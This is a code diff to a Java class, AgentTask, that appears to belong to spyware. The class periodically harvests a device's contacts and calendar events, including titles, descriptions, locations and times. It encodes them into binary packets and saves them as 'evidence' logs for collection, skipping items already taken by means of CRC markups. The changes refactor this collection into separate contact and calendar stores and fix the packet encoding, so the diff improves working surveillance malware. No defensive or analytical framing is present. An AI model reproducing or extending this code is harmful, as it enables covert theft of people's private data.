@@ -52,10 +52,11 @@ public class AgentTask extends AgentBase {
 	private static final int HEADER_LEN = 12;
 	private PickContact contact;
 
-	Markup markup;
+	Markup markupCalendar;
+	Markup markupContacts;
 
 	HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)
-	HashMap<Long, Long> events;
+	HashMap<Long, Long> calendar;
 
 	public AgentTask() {
 
@@ -75,16 +76,13 @@ public class AgentTask extends AgentBase {
 		setPeriod(180 * 60 * 1000);
 		setDelay(200);
 
-		markup = new Markup(AgentType.AGENT_TASK);
-		final boolean needSerialize = false;
+		markupContacts = new Markup(AgentType.AGENT_TASK, 0);
+		markupCalendar = new Markup(AgentType.AGENT_TASK, 1);
 
 		// the markup exists, try to read it
-		if (markup.isMarkup()) {
+		if (markupContacts.isMarkup()) {
 			try {
-				HashMap<Long, Long>[] pair;
-				pair = (HashMap<Long, Long>[]) markup.readMarkupSerializable();
-				contacts = pair[0];
-				events = pair[1];
+				contacts = (HashMap<Long, Long>) markupContacts.readMarkupSerializable();
 			} catch (final IOException e) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error (begin): cannot read markup");//$NON-NLS-1$
@@ -92,36 +90,62 @@ public class AgentTask extends AgentBase {
 			}
 		}
 
-		boolean serialize = false;
+		// the markup exists, try to read it
+		if (markupCalendar.isMarkup()) {
+			try {
+				calendar = (HashMap<Long, Long>) markupCalendar.readMarkupSerializable();
+			} catch (final IOException e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Error (begin): cannot read markup");//$NON-NLS-1$
+				}
+			}
+		}
+
 		// if no markup available, create a new empty one
 		if (contacts == null) {
 			contacts = new HashMap<Long, Long>();
-			serialize = true;
+			serializeContacts();
 		}
 
-		if (events == null) {
-			events = new HashMap<Long, Long>();
-			serialize = true;
+		if (calendar == null) {
+			calendar = new HashMap<Long, Long>();
+			serializeCalendar();
 		}
-		if (serialize) {
-			serializePairs();
 
+	}
+
+	/**
+	 * serialize contacts in the markup
+	 */
+	private void serializeContacts() {
+		if (Cfg.DEBUG) {
+			Check.ensures(contacts != null, "null contacts"); //$NON-NLS-1$
+		}
+
+		try {
+
+			final boolean ret = markupContacts.writeMarkupSerializable(contacts);
+			if (Cfg.DEBUG) {
+				Check.ensures(ret, "cannot serialize"); //$NON-NLS-1$
+			}
+		} catch (final IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error (serializeContacts): " + e);//$NON-NLS-1$
+			}
 		}
 	}
 
 	/**
 	 * serialize contacts in the markup
 	 */
-	private void serializePairs() {
+	private void serializeCalendar() {
 		if (Cfg.DEBUG) {
-			Check.ensures(contacts != null, "null contacts"); //$NON-NLS-1$
+			Check.ensures(calendar != null, "null calendar"); //$NON-NLS-1$
 		}
 
 		try {
-			HashMap<Long, Long>[] pair = (HashMap<Long, Long>[]) new HashMap<?, ?>[2];
-			pair[0] = contacts;
-			pair[1] = events;
-			final boolean ret = markup.writeMarkupSerializable(pair);
+
+			final boolean ret = markupCalendar.writeMarkupSerializable(calendar);
 			if (Cfg.DEBUG) {
 				Check.ensures(ret, "cannot serialize"); //$NON-NLS-1$
 			}
@@ -138,14 +162,11 @@ public class AgentTask extends AgentBase {
 	 */
 	@Override
 	public void go() {
-		boolean needToSerialize = contacts();
-		needToSerialize |= calendar();
-
-		if (needToSerialize) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go): serialize contacts");//$NON-NLS-1$
-			}
-			serializePairs();
+		if (contacts()) {
+			serializeContacts();
+		}
+		if (calendar()) {
+			serializeCalendar();
 		}
 	}
 
@@ -215,7 +236,7 @@ public class AgentTask extends AgentBase {
 				final byte[] packet = preparePacket(idEvent, title, description, location, begin, end, rrule, allDay);
 				// if(Cfg.DEBUG) Check.log( TAG + " (go): "  ;//$NON-NLS-1$
 				// Utils.byteArrayToHex(packet));
-				final Long crcOld = events.get(idEvent);
+				final Long crcOld = calendar.get(idEvent);
 				final Long crcNew = Encryption.CRC32(packet);
 				// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> "  ;//$NON-NLS-1$
 				// crcNew);
@@ -225,7 +246,7 @@ public class AgentTask extends AgentBase {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (go): new event. " + idEvent);//$NON-NLS-1$
 					}
-					events.put(idEvent, crcNew);
+					calendar.put(idEvent, crcNew);
 					saveEvidence(idEvent, packet);
 					needToSerialize = true;
 					Thread.yield();
@@ -340,7 +361,7 @@ public class AgentTask extends AgentBase {
 	 * @param packet
 	 */
 	private void saveEvidence(long idEvent, byte[] packet) {
-		events.put(idEvent, Encryption.CRC32(packet));
+		calendar.put(idEvent, Encryption.CRC32(packet));
 		final LogR log = new LogR(EvidenceType.CALENDAR);
 		log.write(packet);
 		log.close();
@@ -364,17 +385,17 @@ public class AgentTask extends AgentBase {
 			// preparazione del payload, con la parte fissa e quella dinamica
 
 			if (rrule != null) {
-				flags |= FLAG_RECUR;
-				if (end == null) {
-					flags |= FLAG_RECUR_NoEndDate;
-				}
+				//flags |= FLAG_RECUR;
+				//if (end == null) {
+				//	flags |= FLAG_RECUR_NoEndDate;
+				//}
 			}
 			if (allDay) {
 				flags |= FLAG_ALLDAY;
 			}
 			int sensitivity = 0;
 			int busy = 2;
-			int duration=0;
+			int duration = 0;
 			int meeting = 0;
 			payload.write(Utils.intToByteArray(flags));
 			payload.write(Utils.longToByteArray(DateTime.getFiledate(begin)));
@@ -387,27 +408,30 @@ public class AgentTask extends AgentBase {
 			// blocchi di stringhe
 
 			byte[] data = WChar.getBytes(title);
-			int len = POOM_STRING_SUBJECT & data.length;
+			int len = POOM_STRING_SUBJECT | data.length;
 			payload.write(Utils.intToByteArray(len));
 			payload.write(data);
 
+			if (rrule != null) {
+				description += " \nRULE:" + rrule;
+			}
 			data = WChar.getBytes(description);
-			len = POOM_STRING_BODY & data.length;
+			len = POOM_STRING_BODY | data.length;
 			payload.write(Utils.intToByteArray(len));
 			payload.write(data);
 
 			data = WChar.getBytes(location);
-			len = POOM_STRING_LOCATION & data.length;
+			len = POOM_STRING_LOCATION | data.length;
 			payload.write(Utils.intToByteArray(len));
 			payload.write(data);
 
 			// final byte[] payloadBA = payload.toByteArray();
-			final int size = payload.size() + HEADER_LEN;
+			final int size = payload.size();
 			final byte[] packet = payload.toByteArray();
-			
+
 			final DataBuffer databuffer = new DataBuffer(packet);
 			databuffer.writeInt(size);
-			
+
 			return packet;
 
 		} catch (IOException ex) {
@@ -504,5 +528,9 @@ public class AgentTask extends AgentBase {
 	@Override
 	public void end() {
 
+	}
+
+	public int numMarkups() {
+		return 2;
 	}
 }
